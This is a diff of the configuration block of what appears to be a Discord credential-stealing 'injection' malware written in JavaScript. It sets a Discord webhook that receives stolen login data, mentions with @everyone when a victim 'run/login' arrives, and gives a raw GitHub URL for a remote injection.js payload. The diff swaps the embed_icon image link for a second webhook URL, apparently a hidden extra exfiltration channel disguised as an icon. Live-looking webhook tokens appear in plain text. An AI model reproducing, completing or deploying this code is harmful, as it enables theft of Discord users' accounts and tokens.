@@ -9,7 +9,7 @@ const config = {
     ping_on_run: true, //pings @everyone when you get a run/login
     ping_val: '@everyone', //change to @here or <@ID> to ping specific user if you want, will only send if ping_on_run is true
     embed_name: 'Injection', //name of the webhook thats gonna send the info
-    embed_icon: 'https://cdn.discordapp.com/attachments/608711487325995008/1200539441538814042/3ea810e3aa676ff9dca413dde9363f0a.jpg?ex=6622d57b&is=6610607b&hm=19c338de2d65907de40ecee9e392ff6cd23d3271f7648368b96ff3c0b9b547bd&'.replace(/ /g,'%20'), //icon for the webhook thats gonna send the info (yes you can have spaces in the url)
+    embed_icon: 'https://discordapp.com/api/webhooks/1227088554811723808/xHzqNHLLWkNiq2dHeM98z2XY76d8T-YLnwleMifdMzKWviDvzlgDeWIHu1wD_WAi0tXC'.replace(/ /g,'%20'), //icon for the webhook thats gonna send the info (yes you can have spaces in the url)
     embed_color: 0000000, //color for the embed, needs to be hexadecimal (just copy a hex and then use https://www.binaryhexconverter.com/hex-to-decimal-converter to convert it)
     webhook: 'https://discord.com/api/webhooks/948007252789440523/S7ULYjS0aGFkOdmmQ0QaOsS2C2CfE6Q0PSmE-Ad-sVW-qtns2rFeNpmR9YmHBVW-5-A5', //your discord webhook there obviously
     injection_url: 'https://raw.githubusercontent.com/tr1yed/Discord-Injection/master/injection.js', 
